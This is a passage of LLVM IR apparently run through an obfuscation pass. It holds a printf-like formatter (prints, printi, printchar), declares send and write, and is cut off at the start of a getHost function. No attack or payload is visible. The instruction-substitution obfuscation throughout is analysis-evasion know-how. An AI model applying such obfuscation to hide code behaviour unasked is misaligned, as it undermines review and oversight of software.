; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %341

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %328

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %70

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = xor i32 %53, -1
  %55 = xor i32 2, -1
  %56 = xor i32 1451171968, -1
  %57 = and i32 %54, 1451171968
  %58 = and i32 %53, %56
  %59 = and i32 %55, 1451171968
  %60 = and i32 2, %56
  %61 = or i32 %57, %58
  %62 = or i32 %59, %60
  %63 = xor i32 %61, %62
  %64 = or i32 %54, %55
  %65 = xor i32 %64, -1
  %66 = or i32 1451171968, %56
  %67 = and i32 %65, %66
  %68 = or i32 %63, %67
  %69 = or i32 %53, 2
  store i32 %68, i32* %8, align 4
  br label %45

; <label>:70:                                     ; preds = %45
  br label %71

; <label>:71:                                     ; preds = %97, %70
  %72 = load i8*, i8** %5, align 8
  %73 = load i8, i8* %72, align 1
  %74 = zext i8 %73 to i32
  %75 = icmp sge i32 %74, 48
  br i1 %75, label %76, label %81

; <label>:76:                                     ; preds = %71
  %77 = load i8*, i8** %5, align 8
  %78 = load i8, i8* %77, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp sle i32 %79, 57
  br label %81

; <label>:81:                                     ; preds = %76, %71
  %82 = phi i1 [ false, %71 ], [ %80, %76 ]
  br i1 %82, label %83, label %100

; <label>:83:                                     ; preds = %81
  %84 = load i32, i32* %7, align 4
  %85 = mul nsw i32 %84, 10
  store i32 %85, i32* %7, align 4
  %86 = load i8*, i8** %5, align 8
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = sub i32 0, 48
  %90 = add i32 %88, %89
  %91 = sub nsw i32 %88, 48
  %92 = load i32, i32* %7, align 4
  %93 = add i32 %92, 2146880371
  %94 = add i32 %93, %90
  %95 = sub i32 %94, 2146880371
  %96 = add nsw i32 %92, %90
  store i32 %95, i32* %7, align 4
  br label %97

; <label>:97:                                     ; preds = %83
  %98 = load i8*, i8** %5, align 8
  %99 = getelementptr inbounds i8, i8* %98, i32 1
  store i8* %99, i8** %5, align 8
  br label %71

; <label>:100:                                    ; preds = %81
  %101 = load i8*, i8** %5, align 8
  %102 = load i8, i8* %101, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 115
  br i1 %104, label %105, label %144

; <label>:105:                                    ; preds = %100
  %106 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %107 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %106, i32 0, i32 0
  %108 = load i32, i32* %107, align 8
  %109 = icmp ule i32 %108, 40
  br i1 %109, label %110, label %118

; <label>:110:                                    ; preds = %105
  %111 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %106, i32 0, i32 3
  %112 = load i8*, i8** %111, align 8
  %113 = getelementptr i8, i8* %112, i32 %108
  %114 = bitcast i8* %113 to i32*
  %115 = sub i32 0, 8
  %116 = sub i32 %108, %115
  %117 = add i32 %108, 8
  store i32 %116, i32* %107, align 8
  br label %123

; <label>:118:                                    ; preds = %105
  %119 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %106, i32 0, i32 2
  %120 = load i8*, i8** %119, align 8
  %121 = bitcast i8* %120 to i32*
  %122 = getelementptr i8, i8* %120, i32 8
  store i8* %122, i8** %119, align 8
  br label %123

; <label>:123:                                    ; preds = %118, %110
  %124 = phi i32* [ %114, %110 ], [ %121, %118 ]
  %125 = load i32, i32* %124, align 4
  %126 = sext i32 %125 to i64
  %127 = inttoptr i64 %126 to i8*
  store i8* %127, i8** %11, align 8
  %128 = load i8**, i8*** %4, align 8
  %129 = load i8*, i8** %11, align 8
  %130 = icmp ne i8* %129, null
  br i1 %130, label %131, label %133

; <label>:131:                                    ; preds = %123
  %132 = load i8*, i8** %11, align 8
  br label %134

; <label>:133:                                    ; preds = %123
  br label %134

; <label>:134:                                    ; preds = %133, %131
  %135 = phi i8* [ %132, %131 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.36, i32 0, i32 0), %133 ]
  %136 = load i32, i32* %7, align 4
  %137 = load i32, i32* %8, align 4
  %138 = call i32 @prints(i8** %128, i8* %135, i32 %136, i32 %137)
  %139 = load i32, i32* %9, align 4
  %140 = sub i32 %139, 1200528095
  %141 = add i32 %140, %138
  %142 = add i32 %141, 1200528095
  %143 = add nsw i32 %139, %138
  store i32 %142, i32* %9, align 4
  br label %338

; <label>:144:                                    ; preds = %100
  %145 = load i8*, i8** %5, align 8
  %146 = load i8, i8* %145, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 100
  br i1 %148, label %149, label %180

; <label>:149:                                    ; preds = %144
  %150 = load i8**, i8*** %4, align 8
  %151 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %152 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %151, i32 0, i32 0
  %153 = load i32, i32* %152, align 8
  %154 = icmp ule i32 %153, 40
  br i1 %154, label %155, label %164

; <label>:155:                                    ; preds = %149
  %156 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %151, i32 0, i32 3
  %157 = load i8*, i8** %156, align 8
  %158 = getelementptr i8, i8* %157, i32 %153
  %159 = bitcast i8* %158 to i32*
  %160 = sub i32 %153, -1206381273
  %161 = add i32 %160, 8
  %162 = add i32 %161, -1206381273
  %163 = add i32 %153, 8
  store i32 %162, i32* %152, align 8
  br label %169

; <label>:164:                                    ; preds = %149
  %165 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %151, i32 0, i32 2
  %166 = load i8*, i8** %165, align 8
  %167 = bitcast i8* %166 to i32*
  %168 = getelementptr i8, i8* %166, i32 8
  store i8* %168, i8** %165, align 8
  br label %169

; <label>:169:                                    ; preds = %164, %155
  %170 = phi i32* [ %159, %155 ], [ %167, %164 ]
  %171 = load i32, i32* %170, align 4
  %172 = load i32, i32* %7, align 4
  %173 = load i32, i32* %8, align 4
  %174 = call i32 @printi(i8** %150, i32 %171, i32 10, i32 1, i32 %172, i32 %173, i32 97)
  %175 = load i32, i32* %9, align 4
  %176 = add i32 %175, 699362225
  %177 = add i32 %176, %174
  %178 = sub i32 %177, 699362225
  %179 = add nsw i32 %175, %174
  store i32 %178, i32* %9, align 4
  br label %338

; <label>:180:                                    ; preds = %144
  %181 = load i8*, i8** %5, align 8
  %182 = load i8, i8* %181, align 1
  %183 = zext i8 %182 to i32
  %184 = icmp eq i32 %183, 120
  br i1 %184, label %185, label %215

; <label>:185:                                    ; preds = %180
  %186 = load i8**, i8*** %4, align 8
  %187 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %188 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %187, i32 0, i32 0
  %189 = load i32, i32* %188, align 8
  %190 = icmp ule i32 %189, 40
  br i1 %190, label %191, label %200

; <label>:191:                                    ; preds = %185
  %192 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %187, i32 0, i32 3
  %193 = load i8*, i8** %192, align 8
  %194 = getelementptr i8, i8* %193, i32 %189
  %195 = bitcast i8* %194 to i32*
  %196 = sub i32 %189, -34136968
  %197 = add i32 %196, 8
  %198 = add i32 %197, -34136968
  %199 = add i32 %189, 8
  store i32 %198, i32* %188, align 8
  br label %205

; <label>:200:                                    ; preds = %185
  %201 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %187, i32 0, i32 2
  %202 = load i8*, i8** %201, align 8
  %203 = bitcast i8* %202 to i32*
  %204 = getelementptr i8, i8* %202, i32 8
  store i8* %204, i8** %201, align 8
  br label %205

; <label>:205:                                    ; preds = %200, %191
  %206 = phi i32* [ %195, %191 ], [ %203, %200 ]
  %207 = load i32, i32* %206, align 4
  %208 = load i32, i32* %7, align 4
  %209 = load i32, i32* %8, align 4
  %210 = call i32 @printi(i8** %186, i32 %207, i32 16, i32 0, i32 %208, i32 %209, i32 97)
  %211 = load i32, i32* %9, align 4
  %212 = sub i32 0, %210
  %213 = sub i32 %211, %212
  %214 = add nsw i32 %211, %210
  store i32 %213, i32* %9, align 4
  br label %338

; <label>:215:                                    ; preds = %180
  %216 = load i8*, i8** %5, align 8
  %217 = load i8, i8* %216, align 1
  %218 = zext i8 %217 to i32
  %219 = icmp eq i32 %218, 88
  br i1 %219, label %220, label %251

; <label>:220:                                    ; preds = %215
  %221 = load i8**, i8*** %4, align 8
  %222 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %223 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %222, i32 0, i32 0
  %224 = load i32, i32* %223, align 8
  %225 = icmp ule i32 %224, 40
  br i1 %225, label %226, label %234

; <label>:226:                                    ; preds = %220
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %222, i32 0, i32 3
  %228 = load i8*, i8** %227, align 8
  %229 = getelementptr i8, i8* %228, i32 %224
  %230 = bitcast i8* %229 to i32*
  %231 = sub i32 0, 8
  %232 = sub i32 %224, %231
  %233 = add i32 %224, 8
  store i32 %232, i32* %223, align 8
  br label %239

; <label>:234:                                    ; preds = %220
  %235 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %222, i32 0, i32 2
  %236 = load i8*, i8** %235, align 8
  %237 = bitcast i8* %236 to i32*
  %238 = getelementptr i8, i8* %236, i32 8
  store i8* %238, i8** %235, align 8
  br label %239

; <label>:239:                                    ; preds = %234, %226
  %240 = phi i32* [ %230, %226 ], [ %237, %234 ]
  %241 = load i32, i32* %240, align 4
  %242 = load i32, i32* %7, align 4
  %243 = load i32, i32* %8, align 4
  %244 = call i32 @printi(i8** %221, i32 %241, i32 16, i32 0, i32 %242, i32 %243, i32 65)
  %245 = load i32, i32* %9, align 4
  %246 = sub i32 0, %245
  %247 = sub i32 0, %244
  %248 = add i32 %246, %247
  %249 = sub i32 0, %248
  %250 = add nsw i32 %245, %244
  store i32 %249, i32* %9, align 4
  br label %338

; <label>:251:                                    ; preds = %215
  %252 = load i8*, i8** %5, align 8
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 117
  br i1 %255, label %256, label %287

; <label>:256:                                    ; preds = %251
  %257 = load i8**, i8*** %4, align 8
  %258 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %259 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %258, i32 0, i32 0
  %260 = load i32, i32* %259, align 8
  %261 = icmp ule i32 %260, 40
  br i1 %261, label %262, label %272

; <label>:262:                                    ; preds = %256
  %263 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %258, i32 0, i32 3
  %264 = load i8*, i8** %263, align 8
  %265 = getelementptr i8, i8* %264, i32 %260
  %266 = bitcast i8* %265 to i32*
  %267 = sub i32 0, %260
  %268 = sub i32 0, 8
  %269 = add i32 %267, %268
  %270 = sub i32 0, %269
  %271 = add i32 %260, 8
  store i32 %270, i32* %259, align 8
  br label %277

; <label>:272:                                    ; preds = %256
  %273 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %258, i32 0, i32 2
  %274 = load i8*, i8** %273, align 8
  %275 = bitcast i8* %274 to i32*
  %276 = getelementptr i8, i8* %274, i32 8
  store i8* %276, i8** %273, align 8
  br label %277

; <label>:277:                                    ; preds = %272, %262
  %278 = phi i32* [ %266, %262 ], [ %275, %272 ]
  %279 = load i32, i32* %278, align 4
  %280 = load i32, i32* %7, align 4
  %281 = load i32, i32* %8, align 4
  %282 = call i32 @printi(i8** %257, i32 %279, i32 10, i32 0, i32 %280, i32 %281, i32 97)
  %283 = load i32, i32* %9, align 4
  %284 = sub i32 0, %282
  %285 = sub i32 %283, %284
  %286 = add nsw i32 %283, %282
  store i32 %285, i32* %9, align 4
  br label %338

; <label>:287:                                    ; preds = %251
  %288 = load i8*, i8** %5, align 8
  %289 = load i8, i8* %288, align 1
  %290 = zext i8 %289 to i32
  %291 = icmp eq i32 %290, 99
  br i1 %291, label %292, label %326

; <label>:292:                                    ; preds = %287
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %293, i32 0, i32 0
  %295 = load i32, i32* %294, align 8
  %296 = icmp ule i32 %295, 40
  br i1 %296, label %297, label %305

; <label>:297:                                    ; preds = %292
  %298 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %293, i32 0, i32 3
  %299 = load i8*, i8** %298, align 8
  %300 = getelementptr i8, i8* %299, i32 %295
  %301 = bitcast i8* %300 to i32*
  %302 = sub i32 0, 8
  %303 = sub i32 %295, %302
  %304 = add i32 %295, 8
  store i32 %303, i32* %294, align 8
  br label %310

; <label>:305:                                    ; preds = %292
  %306 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %293, i32 0, i32 2
  %307 = load i8*, i8** %306, align 8
  %308 = bitcast i8* %307 to i32*
  %309 = getelementptr i8, i8* %307, i32 8
  store i8* %309, i8** %306, align 8
  br label %310

; <label>:310:                                    ; preds = %305, %297
  %311 = phi i32* [ %301, %297 ], [ %308, %305 ]
  %312 = load i32, i32* %311, align 4
  %313 = trunc i32 %312 to i8
  %314 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %313, i8* %314, align 1
  %315 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %315, align 1
  %316 = load i8**, i8*** %4, align 8
  %317 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %318 = load i32, i32* %7, align 4
  %319 = load i32, i32* %8, align 4
  %320 = call i32 @prints(i8** %316, i8* %317, i32 %318, i32 %319)
  %321 = load i32, i32* %9, align 4
  %322 = add i32 %321, -2029029938
  %323 = add i32 %322, %320
  %324 = sub i32 %323, -2029029938
  %325 = add nsw i32 %321, %320
  store i32 %324, i32* %9, align 4
  br label %338

; <label>:326:                                    ; preds = %287
  br label %337

; <label>:327:                                    ; preds = %17
  br label %328

; <label>:328:                                    ; preds = %327, %35
  %329 = load i8**, i8*** %4, align 8
  %330 = load i8*, i8** %5, align 8
  %331 = load i8, i8* %330, align 1
  %332 = zext i8 %331 to i32
  call void @printchar(i8** %329, i32 %332)
  %333 = load i32, i32* %9, align 4
  %334 = sub i32 0, 1
  %335 = sub i32 %333, %334
  %336 = add nsw i32 %333, 1
  store i32 %335, i32* %9, align 4
  br label %337

; <label>:337:                                    ; preds = %328, %326
  br label %338

; <label>:338:                                    ; preds = %337, %310, %277, %239, %205, %169, %134
  %339 = load i8*, i8** %5, align 8
  %340 = getelementptr inbounds i8, i8* %339, i32 1
  store i8* %340, i8** %5, align 8
  br label %12

; <label>:341:                                    ; preds = %29, %12
  %342 = load i8**, i8*** %4, align 8
  %343 = icmp ne i8** %342, null
  br i1 %343, label %344, label %347

; <label>:344:                                    ; preds = %341
  %345 = load i8**, i8*** %4, align 8
  %346 = load i8*, i8** %345, align 8
  store i8 0, i8* %346, align 1
  br label %347

; <label>:347:                                    ; preds = %344, %341
  %348 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %349 = bitcast %struct.__va_list_tag* %348 to i8*
  call void @llvm.va_end(i8* %349)
  %350 = load i32, i32* %9, align 4
  ret i32 %350
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #6

declare i64 @send(i32, i8*, i64, i32) #2

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %55

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %27, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %30

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add i32 %22, 413736820
  %24 = add i32 %23, 1
  %25 = sub i32 %24, 413736820
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %11, align 4
  br label %27

; <label>:27:                                     ; preds = %21
  %28 = load i8*, i8** %12, align 8
  %29 = getelementptr inbounds i8, i8* %28, i32 1
  store i8* %29, i8** %12, align 8
  br label %17

; <label>:30:                                     ; preds = %17
  %31 = load i32, i32* %11, align 4
  %32 = load i32, i32* %7, align 4
  %33 = icmp sge i32 %31, %32
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %30
  store i32 0, i32* %7, align 4
  br label %42

; <label>:35:                                     ; preds = %30
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = add i32 %37, 655386265
  %39 = sub i32 %38, %36
  %40 = sub i32 %39, 655386265
  %41 = sub nsw i32 %37, %36
  store i32 %40, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %35, %34
  %43 = load i32, i32* %8, align 4
  %44 = xor i32 %43, -1
  %45 = xor i32 2, -1
  %46 = xor i32 734291046, -1
  %47 = or i32 %44, %45
  %48 = or i32 734291046, %46
  %49 = xor i32 %47, -1
  %50 = and i32 %49, %48
  %51 = and i32 %43, 2
  %52 = icmp ne i32 %50, 0
  br i1 %52, label %53, label %54

; <label>:53:                                     ; preds = %42
  store i32 48, i32* %10, align 4
  br label %54

; <label>:54:                                     ; preds = %53, %42
  br label %55

; <label>:55:                                     ; preds = %54, %4
  %56 = load i32, i32* %8, align 4
  %57 = xor i32 1, -1
  %58 = xor i32 %56, %57
  %59 = and i32 %58, %56
  %60 = and i32 %56, 1
  %61 = icmp ne i32 %59, 0
  br i1 %61, label %80, label %62

; <label>:62:                                     ; preds = %55
  br label %63

; <label>:63:                                     ; preds = %73, %62
  %64 = load i32, i32* %7, align 4
  %65 = icmp sgt i32 %64, 0
  br i1 %65, label %66, label %79

; <label>:66:                                     ; preds = %63
  %67 = load i8**, i8*** %5, align 8
  %68 = load i32, i32* %10, align 4
  call void @printchar(i8** %67, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = sub i32 0, 1
  %71 = sub i32 %69, %70
  %72 = add nsw i32 %69, 1
  store i32 %71, i32* %9, align 4
  br label %73

; <label>:73:                                     ; preds = %66
  %74 = load i32, i32* %7, align 4
  %75 = add i32 %74, 1592497545
  %76 = add i32 %75, -1
  %77 = sub i32 %76, 1592497545
  %78 = add nsw i32 %74, -1
  store i32 %77, i32* %7, align 4
  br label %63

; <label>:79:                                     ; preds = %63
  br label %80

; <label>:80:                                     ; preds = %79, %55
  br label %81

; <label>:81:                                     ; preds = %95, %80
  %82 = load i8*, i8** %6, align 8
  %83 = load i8, i8* %82, align 1
  %84 = icmp ne i8 %83, 0
  br i1 %84, label %85, label %98

; <label>:85:                                     ; preds = %81
  %86 = load i8**, i8*** %5, align 8
  %87 = load i8*, i8** %6, align 8
  %88 = load i8, i8* %87, align 1
  %89 = zext i8 %88 to i32
  call void @printchar(i8** %86, i32 %89)
  %90 = load i32, i32* %9, align 4
  %91 = add i32 %90, 1592865098
  %92 = add i32 %91, 1
  %93 = sub i32 %92, 1592865098
  %94 = add nsw i32 %90, 1
  store i32 %93, i32* %9, align 4
  br label %95

; <label>:95:                                     ; preds = %85
  %96 = load i8*, i8** %6, align 8
  %97 = getelementptr inbounds i8, i8* %96, i32 1
  store i8* %97, i8** %6, align 8
  br label %81

; <label>:98:                                     ; preds = %81
  br label %99

; <label>:99:                                     ; preds = %109, %98
  %100 = load i32, i32* %7, align 4
  %101 = icmp sgt i32 %100, 0
  br i1 %101, label %102, label %115

; <label>:102:                                    ; preds = %99
  %103 = load i8**, i8*** %5, align 8
  %104 = load i32, i32* %10, align 4
  call void @printchar(i8** %103, i32 %104)
  %105 = load i32, i32* %9, align 4
  %106 = sub i32 0, 1
  %107 = sub i32 %105, %106
  %108 = add nsw i32 %105, 1
  store i32 %107, i32* %9, align 4
  br label %109

; <label>:109:                                    ; preds = %102
  %110 = load i32, i32* %7, align 4
  %111 = add i32 %110, -2046171775
  %112 = add i32 %111, -1
  %113 = sub i32 %112, -2046171775
  %114 = add nsw i32 %110, -1
  store i32 %113, i32* %7, align 4
  br label %99

; <label>:115:                                    ; preds = %99
  %116 = load i32, i32* %9, align 4
  ret i32 %116
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %127

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %48

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %48

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %48

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub i32 0, -229508095
  %45 = sub i32 %44, %43
  %46 = add i32 %45, -229508095
  %47 = sub nsw i32 0, %43
  store i32 %46, i32* %21, align 4
  br label %48

; <label>:48:                                     ; preds = %42, %39, %36, %33
  %49 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %50 = getelementptr inbounds i8, i8* %49, i64 12
  %51 = getelementptr inbounds i8, i8* %50, i64 -1
  store i8* %51, i8** %17, align 8
  %52 = load i8*, i8** %17, align 8
  store i8 0, i8* %52, align 1
  br label %53

; <label>:53:                                     ; preds = %76, %48
  %54 = load i32, i32* %21, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %87

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* %21, align 4
  %58 = load i32, i32* %11, align 4
  %59 = urem i32 %57, %58
  store i32 %59, i32* %18, align 4
  %60 = load i32, i32* %18, align 4
  %61 = icmp sge i32 %60, 10
  br i1 %61, label %62, label %76

; <label>:62:                                     ; preds = %56
  %63 = load i32, i32* %15, align 4
  %64 = sub i32 %63, 6615074
  %65 = sub i32 %64, 48
  %66 = add i32 %65, 6615074
  %67 = sub nsw i32 %63, 48
  %68 = add i32 %66, 732606365
  %69 = sub i32 %68, 10
  %70 = sub i32 %69, 732606365
  %71 = sub nsw i32 %66, 10
  %72 = load i32, i32* %18, align 4
  %73 = sub i32 0, %70
  %74 = sub i32 %72, %73
  %75 = add nsw i32 %72, %70
  store i32 %74, i32* %18, align 4
  br label %76

; <label>:76:                                     ; preds = %62, %56
  %77 = load i32, i32* %18, align 4
  %78 = sub i32 0, 48
  %79 = sub i32 %77, %78
  %80 = add nsw i32 %77, 48
  %81 = trunc i32 %79 to i8
  %82 = load i8*, i8** %17, align 8
  %83 = getelementptr inbounds i8, i8* %82, i32 -1
  store i8* %83, i8** %17, align 8
  store i8 %81, i8* %83, align 1
  %84 = load i32, i32* %11, align 4
  %85 = load i32, i32* %21, align 4
  %86 = udiv i32 %85, %84
  store i32 %86, i32* %21, align 4
  br label %53

; <label>:87:                                     ; preds = %53
  %88 = load i32, i32* %19, align 4
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %116

; <label>:90:                                     ; preds = %87
  %91 = load i32, i32* %13, align 4
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %112

; <label>:93:                                     ; preds = %90
  %94 = load i32, i32* %14, align 4
  %95 = xor i32 2, -1
  %96 = xor i32 %94, %95
  %97 = and i32 %96, %94
  %98 = and i32 %94, 2
  %99 = icmp ne i32 %97, 0
  br i1 %99, label %100, label %112

; <label>:100:                                    ; preds = %93
  %101 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %101, i32 45)
  %102 = load i32, i32* %20, align 4
  %103 = add i32 %102, -452379495
  %104 = add i32 %103, 1
  %105 = sub i32 %104, -452379495
  %106 = add nsw i32 %102, 1
  store i32 %105, i32* %20, align 4
  %107 = load i32, i32* %13, align 4
  %108 = sub i32 %107, -967876817
  %109 = add i32 %108, -1
  %110 = add i32 %109, -967876817
  %111 = add nsw i32 %107, -1
  store i32 %110, i32* %13, align 4
  br label %115

; <label>:112:                                    ; preds = %93, %90
  %113 = load i8*, i8** %17, align 8
  %114 = getelementptr inbounds i8, i8* %113, i32 -1
  store i8* %114, i8** %17, align 8
  store i8 45, i8* %114, align 1
  br label %115

; <label>:115:                                    ; preds = %112, %100
  br label %116

; <label>:116:                                    ; preds = %115, %87
  %117 = load i32, i32* %20, align 4
  %118 = load i8**, i8*** %9, align 8
  %119 = load i8*, i8** %17, align 8
  %120 = load i32, i32* %13, align 4
  %121 = load i32, i32* %14, align 4
  %122 = call i32 @prints(i8** %118, i8* %119, i32 %120, i32 %121)
  %123 = add i32 %117, -1022262316
  %124 = add i32 %123, %122
  %125 = sub i32 %124, -1022262316
  %126 = add nsw i32 %117, %122
  store i32 %125, i32* %8, align 4
  br label %127

; <label>:127:                                    ; preds = %116, %25
  %128 = load i32, i32* %8, align 4
  ret i32 %128
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

declare i64 @write(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
